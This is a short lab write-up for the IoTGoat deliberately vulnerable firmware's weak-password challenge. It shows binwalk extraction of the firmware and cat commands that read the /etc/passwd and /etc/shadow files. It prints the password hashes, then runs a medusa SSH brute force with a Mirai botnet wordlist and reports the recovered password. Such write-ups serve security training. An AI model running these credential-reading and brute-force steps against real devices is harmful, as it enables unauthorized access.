# Challenge 1:Weak, Guessable, or Hardcoded Passwords

Step 1: Downloaded the IoTGoat-raspberry-pi2.img from the github

Step 2: Extracted Firmware Filesystem by the command ```binwalk -e IoTGoat-raspberry-pi2.img```.

Step 3: Viewed the content of the file _IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/passwd* by ```cat _IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/passwd```.Founded root has access to /bin/ash, iotgoatuser also has access to /bin/ash.
       
Step 4: Checked the /etc/shadow file for password hashes by ```cat __IoTGoat-raspberry-pi2.img.extracted/squashfs-root/etc/shadow``` and founded the hashes root: $1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1
iotgoatuser: $1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.

Step 5: Downloaded the git repo SecLists by danielmiessler to brute force the passwords.

Step 6: Separated the passwords from the default list by ```awk '{print $2}' SecLists/Passwords/Malware/mirai-botnet.txt > SecLists/Passwords/Malware/mirai-botnet_passwords.txt```

Step 7: Used the tool medusa to brute force every password stored in the file mirai-botnet_passwords.txt by ```medusa -u iotgoatuser -P ~/Desktop/SecLists-master/Passwords/Malware/mirai-botnet_passwords.txt -h 192.168.137.183 -M ssh```

Step 8: Founded the password by brute forcing and it is: ```7ujMko0vizxv``` 

Step 9: 

Step 10:
